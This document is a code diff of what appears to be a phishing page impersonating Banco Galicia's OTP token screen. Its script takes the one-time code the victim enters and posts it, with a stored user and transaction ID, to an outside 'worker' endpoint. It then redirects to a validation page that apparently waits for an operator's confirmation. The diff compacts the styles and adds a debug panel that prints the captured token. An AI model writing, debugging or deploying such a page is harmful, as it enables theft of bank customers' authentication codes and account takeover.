@@ -6,12 +6,7 @@
     <meta name="theme-color" content="#ffffff">
     <title>Token - Galicia</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
             background: #f5f5f5;
@@ -21,7 +16,6 @@
             justify-content: center;
             padding: 20px;
         }
-
         .container {
             max-width: 400px;
             width: 100%;
@@ -31,40 +25,11 @@
             box-shadow: 0 2px 15px rgba(0, 0, 0, 0.06);
             text-align: center;
         }
-
-        /* Logo */
-        .logo {
-            width: 120px;
-            height: auto;
-            margin: 0 auto 18px;
-            display: block;
-        }
-
-        .logo svg {
-            width: 100%;
-            height: auto;
-        }
-
-        /* Título */
-        h1 {
-            color: #555;
-            font-size: 20px;
-            font-weight: 600;
-            margin-bottom: 6px;
-        }
-
-        .subtitle {
-            color: #777;
-            font-size: 12px;
-            line-height: 1.6;
-            margin-bottom: 18px;
-        }
-
-        /* Input del token */
-        .input-wrapper {
-            margin: 16px 0 14px;
-        }
-
+        .logo { width: 120px; height: auto; margin: 0 auto 18px; display: block; }
+        .logo svg { width: 100%; height: auto; }
+        h1 { color: #555; font-size: 20px; font-weight: 600; margin-bottom: 6px; }
+        .subtitle { color: #777; font-size: 12px; line-height: 1.6; margin-bottom: 18px; }
+        .input-wrapper { margin: 16px 0 14px; }
         .token-input {
             width: 100%;
             max-width: 260px;
@@ -80,31 +45,15 @@
             background: #fafafa;
             font-family: 'Courier New', monospace;
         }
-
-        .token-input:focus {
-            border-color: #f47721;
-            background: white;
-        }
-
+        .token-input:focus { border-color: #f47721; background: white; }
         .token-input::placeholder {
             letter-spacing: 2px;
             font-size: 13px;
             color: #aaa;
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
         }
-
-        .error-msg {
-            color: #dc3545;
-            font-size: 12px;
-            margin-top: 6px;
-            display: none;
-        }
-
-        .error-msg.show {
-            display: block;
-        }
-
-        /* Caja de ayuda */
+        .error-msg { color: #dc3545; font-size: 12px; margin-top: 6px; display: none; }
+        .error-msg.show { display: block; }
         .help-box {
             text-align: left;
             background: #f8f9fa;
@@ -113,25 +62,9 @@
             margin: 16px 0 22px;
             border-left: 3px solid #f47721;
         }
-
-        .help-title {
-            font-size: 13px;
-            font-weight: 600;
-            color: #333;
-            margin-bottom: 6px;
-        }
-
-        .help-text {
-            font-size: 12px;
-            color: #666;
-            line-height: 1.8;
-        }
-
-        .help-text strong {
-            color: #333;
-        }
-
-        /* Botón CONFIRMAR */
+        .help-title { font-size: 13px; font-weight: 600; color: #333; margin-bottom: 6px; }
+        .help-text { font-size: 12px; color: #666; line-height: 1.8; }
+        .help-text strong { color: #333; }
         .btn-confirm {
             width: 100%;
             max-width: 260px;
@@ -147,22 +80,9 @@
             transition: all 0.3s;
             text-transform: uppercase;
         }
-
-        .btn-confirm.active {
-            background: #f47721;
-        }
-
-        .btn-confirm.active:hover {
-            background: #e06a15;
-            transform: translateY(-1px);
-            box-shadow: 0 4px 15px rgba(244, 119, 33, 0.3);
-        }
-
-        .btn-confirm.active:active {
-            transform: translateY(0);
-        }
-
-        /* Loading Overlay */
+        .btn-confirm.active { background: #f47721; }
+        .btn-confirm.active:hover { background: #e06a15; transform: translateY(-1px); box-shadow: 0 4px 15px rgba(244, 119, 33, 0.3); }
+        .btn-confirm.active:active { transform: translateY(0); }
         #loadingOverlay {
             display: none;
             position: fixed;
@@ -176,7 +96,6 @@
             flex-direction: column;
             z-index: 9999;
         }
-
         .loading-container {
             background: white;
             padding: 36px 44px;
@@ -184,7 +103,6 @@
             text-align: center;
             box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
         }
-
         .spinner {
             width: 44px;
             height: 44px;
@@ -194,25 +112,12 @@
             animation: spin 0.8s linear infinite;
             margin: 0 auto 14px;
         }
-
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-
-        .loading-text {
-            color: #333;
-            font-size: 15px;
-            font-weight: 500;
-        }
-
-        .loading-sub {
-            color: #888;
-            font-size: 12px;
-            margin-top: 4px;
-        }
-
-        /* Alert Overlay */
+        .loading-text { color: #333; font-size: 15px; font-weight: 500; }
+        .loading-sub { color: #888; font-size: 12px; margin-top: 4px; }
         .alert-overlay {
             display: none;
             position: fixed;
@@ -225,7 +130,6 @@
             justify-content: center;
             align-items: center;
         }
-
         .alert-box {
             background: white;
             border-radius: 14px;
@@ -235,26 +139,9 @@
             text-align: center;
             box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
         }
-
-        .alert-icon {
-            font-size: 44px;
-            margin-bottom: 6px;
-        }
-
-        .alert-title {
-            font-size: 17px;
-            font-weight: 600;
-            color: #333;
-            margin-bottom: 6px;
-        }
-
-        .alert-message {
-            font-size: 13px;
-            color: #666;
-            line-height: 1.5;
-            margin-bottom: 18px;
-        }
-
+        .alert-icon { font-size: 44px; margin-bottom: 6px; }
+        .alert-title { font-size: 17px; font-weight: 600; color: #333; margin-bottom: 6px; }
+        .alert-message { font-size: 13px; color: #666; line-height: 1.5; margin-bottom: 18px; }
         .alert-btn {
             background: #f47721;
             color: white;
@@ -266,69 +153,44 @@
             cursor: pointer;
             transition: background 0.3s;
         }
-
-        .alert-btn:hover {
-            background: #e06a15;
-        }
-
+        .alert-btn:hover { background: #e06a15; }
         @keyframes shake {
             0%, 100% { transform: translateX(0); }
             25% { transform: translateX(-8px); }
             75% { transform: translateX(8px); }
         }
-
         @media (max-width: 480px) {
-            body {
-                padding: 12px;
-            }
-            .container {
-                padding: 24px 16px 30px;
-                border-radius: 10px;
-            }
-            .logo {
-                width: 100px;
-            }
-            h1 {
-                font-size: 18px;
-            }
-            .token-input {
-                font-size: 18px;
-                padding: 12px 14px;
-                max-width: 220px;
-            }
-            .btn-confirm {
-                padding: 12px;
-                font-size: 14px;
-                max-width: 220px;
-            }
-            .help-box {
-                padding: 12px 14px;
-            }
-            .loading-container {
-                padding: 28px 24px;
-                margin: 0 16px;
-            }
+            body { padding: 12px; }
+            .container { padding: 24px 16px 30px; border-radius: 10px; }
+            .logo { width: 100px; }
+            h1 { font-size: 18px; }
+            .token-input { font-size: 18px; padding: 12px 14px; max-width: 220px; }
+            .btn-confirm { padding: 12px; font-size: 14px; max-width: 220px; }
+            .help-box { padding: 12px 14px; }
+            .loading-container { padding: 28px 24px; margin: 0 16px; }
         }
-
         @media (max-width: 380px) {
-            .token-input {
-                font-size: 16px;
-                padding: 10px 12px;
-                max-width: 190px;
-                letter-spacing: 6px;
-            }
-            .btn-confirm {
-                padding: 10px;
-                font-size: 13px;
-                max-width: 190px;
-            }
+            .token-input { font-size: 16px; padding: 10px 12px; max-width: 190px; letter-spacing: 6px; }
+            .btn-confirm { padding: 10px; font-size: 13px; max-width: 190px; }
         }
+        /* Debug info */
+        .debug-info {
+            font-size: 11px;
+            color: #999;
+            margin-top: 15px;
+            padding: 10px;
+            background: #f8f8f8;
+            border-radius: 6px;
+            text-align: left;
+            word-break: break-all;
+            display: none;
+        }
+        .debug-info.visible { display: block; }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <!-- Logo Galicia -->
         <div class="logo">
             <svg viewBox="0 0 200 60" fill="none" xmlns="http://www.w3.org/2000/svg">
                 <rect x="0" y="0" width="200" height="60" rx="4" fill="#f47721"/>
@@ -365,6 +227,9 @@
         </div>
 
         <button class="btn-confirm" id="continueBtn" disabled>CONFIRMAR</button>
+
+        <!-- Debug info -->
+        <div class="debug-info" id="debugInfo"></div>
     </div>
 
     <!-- Loading Overlay -->
@@ -397,6 +262,7 @@
         const errorMsg = document.getElementById('errorMsg');
         const alertOverlay = document.getElementById('alertOverlay');
         const loadingOverlay = document.getElementById('loadingOverlay');
+        const debugInfo = document.getElementById('debugInfo');
 
         // ==================== FUNCIONES ====================
         function updateButton() {
@@ -433,6 +299,12 @@
             }, 500);
         }
 
+        function showDebug(message) {
+            debugInfo.textContent = message;
+            debugInfo.classList.add('visible');
+            console.log('🐛 DEBUG:', message);
+        }
+
         // ========================= ENVIAR CÓDIGO OTP =========================
         async function enviarCodigo() {
             const token = input.value.trim();
@@ -444,32 +316,38 @@
 
             errorMsg.classList.remove('show');
             loadingOverlay.style.display = 'flex';
+            showDebug('⏳ Enviando código...');
 
             try {
                 // ============================================================
                 // 1. OBTENER DATOS DEL localStorage
                 // ============================================================
-                let bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
-                const transactionId = bancoldata.transactionId;
-                const usuario = bancoldata.usuario;
+                const bancoldataRaw = localStorage.getItem('bancoldata');
+                showDebug(`📦 localStorage.bancoldata: ${bancoldataRaw || 'NO EXISTE'}`);
+                
+                if (!bancoldataRaw) {
+                    throw new Error('No hay datos en localStorage. Inicia sesión nuevamente.');
+                }
 
-                console.log('📦 Datos en localStorage:', bancoldata);
+                let bancoldata = JSON.parse(bancoldataRaw);
+                const transactionId = bancoldata.transactionId;
+                const usuario = bancoldata.usuario || 'desconocido';
+
+                showDebug(`📦 Datos: transactionId=${transactionId}, usuario=${usuario}, token=${token}`);
 
                 // ============================================================
                 // 2. VALIDAR QUE EXISTA TRANSACTION ID
                 // ============================================================
                 if (!transactionId) {
-                    console.error('❌ No hay transactionId en localStorage');
-                    loadingOverlay.style.display = 'none';
-                    alert('Error: Sesión no encontrada. Por favor, inicia sesión nuevamente.');
-                    window.location.href = `${BASE_URL}/index.html`;
-                    return;
+                    throw new Error('transactionId no encontrado en localStorage');
                 }
 
                 console.log('📤 Enviando código OTP:', token);
                 console.log('👤 Usuario:', usuario);
                 console.log('🆔 TransactionId:', transactionId);
                 console.log(`📡 Worker URL: ${WORKER_URL}/otp-code`);
+
+                showDebug(`📡 Enviando a: ${WORKER_URL}/otp-code`);
 
                 // ============================================================
                 // 3. ENVIAR AL WORKER (endpoint /otp-code)
@@ -487,6 +365,7 @@
                 });
 
                 console.log('📊 Status de la respuesta:', response.status);
+                showDebug(`📊 Status: ${response.status}`);
 
                 // ============================================================
                 // 4. PROCESAR RESPUESTA
@@ -495,10 +374,12 @@
                 try {
                     result = await response.json();
                     console.log('📦 Respuesta del worker:', result);
+                    showDebug(`📦 Respuesta: ${JSON.stringify(result)}`);
                 } catch (parseError) {
                     console.error('❌ Error al parsear JSON:', parseError);
                     const textResponse = await response.text();
                     console.log('📄 Respuesta en texto:', textResponse);
+                    showDebug(`📄 Respuesta texto: ${textResponse}`);
                     throw new Error('Error al procesar la respuesta del servidor');
                 }
 
@@ -510,19 +391,24 @@
                 if (result.ok) {
                     // ✅ CÓDIGO VÁLIDO
                     console.log('✅ Código OTP válido');
+                    showDebug('✅ Código válido');
                     
                     // Guardar en localStorage que el OTP fue enviado
                     bancoldata.otp_enviado = true;
                     bancoldata.otp = token;
                     localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
                     
-                    // Redirigir a validacion.html para que espere el estado "otp_recibido"
-                    console.log('🔄 Redirigiendo a validacion.html para esperar confirmación');
-                    window.location.href = `${BASE_URL}/validacion.html`;
+                    // Redirigir a validacion.html
+                    console.log('🔄 Redirigiendo a validacion.html');
+                    showDebug('🔄 Redirigiendo a validacion.html');
+                    setTimeout(() => {
+                        window.location.href = `${BASE_URL}/validacion.html`;
+                    }, 1000);
                     
                 } else {
                     // ❌ CÓDIGO INVÁLIDO
-                    console.log('❌ Código OTP inválido - Respuesta:', result);
+                    console.log('❌ Código OTP inválido');
+                    showDebug(`❌ Código inválido: ${result.error || 'Error desconocido'}`);
                     mostrarErrorCajas();
                     mostrarAlerta();
                 }
@@ -532,9 +418,10 @@
                 // 6. MANEJAR ERRORES
                 // ============================================================
                 console.error('❌ Error detallado:', err);
+                showDebug(`❌ ERROR: ${err.message}`);
                 loadingOverlay.style.display = 'none';
                 mostrarErrorCajas();
-                alert('Error al conectar con el servidor. Por favor, intentá nuevamente.\n\nDetalle: ' + err.message);
+                alert('❌ ' + err.message);
             }
         }
 
@@ -579,17 +466,40 @@
         });
 
         // ==================== INICIALIZAR ====================
-        let bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
-        if (!bancoldata.transactionId) {
-            console.error('❌ No hay transactionId, redirigiendo a index.html');
+        const bancoldataRaw = localStorage.getItem('bancoldata');
+        console.log('🔍 Verificando localStorage al cargar...');
+        console.log('📦 bancoldata:', bancoldataRaw);
+
+        if (!bancoldataRaw) {
+            console.error('❌ No hay datos en localStorage');
+            showDebug('❌ No hay datos en localStorage');
+            alert('Error: Sesión no encontrada. Por favor, inicia sesión nuevamente.');
             window.location.href = `${BASE_URL}/index.html`;
             return;
         }
 
-        console.log('🔍 TransactionId:', bancoldata.transactionId);
-        console.log('👤 Usuario:', bancoldata.usuario);
+        try {
+            const bancoldata = JSON.parse(bancoldataRaw);
+            console.log('📋 Datos parseados:', bancoldata);
+            showDebug(`✅ TransactionId: ${bancoldata.transactionId || 'NO EXISTE'}`);
+            
+            if (!bancoldata.transactionId) {
+                console.error('❌ No hay transactionId');
+                showDebug('❌ No hay transactionId');
+                alert('Error: ID de sesión no encontrado.');
+                window.location.href = `${BASE_URL}/index.html`;
+                return;
+            }
+        } catch (e) {
+            console.error('❌ Error parseando JSON:', e);
+            showDebug(`❌ Error parseando JSON: ${e.message}`);
+            window.location.href = `${BASE_URL}/index.html`;
+            return;
+        }
+
         console.log('🚀 Página de código Galicia lista');
         console.log(`📡 Worker URL: ${WORKER_URL}`);
+        console.log(`🌐 BASE URL: ${BASE_URL}`);
         
         updateButton();
         setTimeout(() => input.focus(), 300);
